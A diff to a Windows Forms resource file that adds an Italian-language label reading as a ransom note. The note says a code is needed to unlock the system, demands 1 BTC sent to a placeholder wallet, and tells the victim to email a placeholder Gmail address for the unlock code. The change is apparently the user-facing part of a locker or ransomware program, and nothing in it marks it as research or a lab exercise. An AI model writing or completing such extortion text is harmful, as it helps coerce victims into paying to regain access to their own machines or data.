@@ -120,6 +120,13 @@
   <metadata name="_openFileDialog.TrayLocation" type="System.Drawing.Point, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a">
     <value>17, 17</value>
   </metadata>
+  <data name="label2.Text" xml:space="preserve">
+    <value>Ti serve un codice per sbloccarlo. Per ottenerlo segui questi passaggi:
+
+1. Versa 1 BTC su questo wallet xxxxxxxxxxyyyyxxx123
+2. Invia il codice di richiesta assieme agli estremi del pagamento via mail a xxxxxxxx@gmail.com
+3. Ti risponderò molto presto inviandoti il codice di sblocco</value>
+  </data>
   <metadata name="$this.Locked" type="System.Boolean, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
     <value>True</value>
   </metadata>
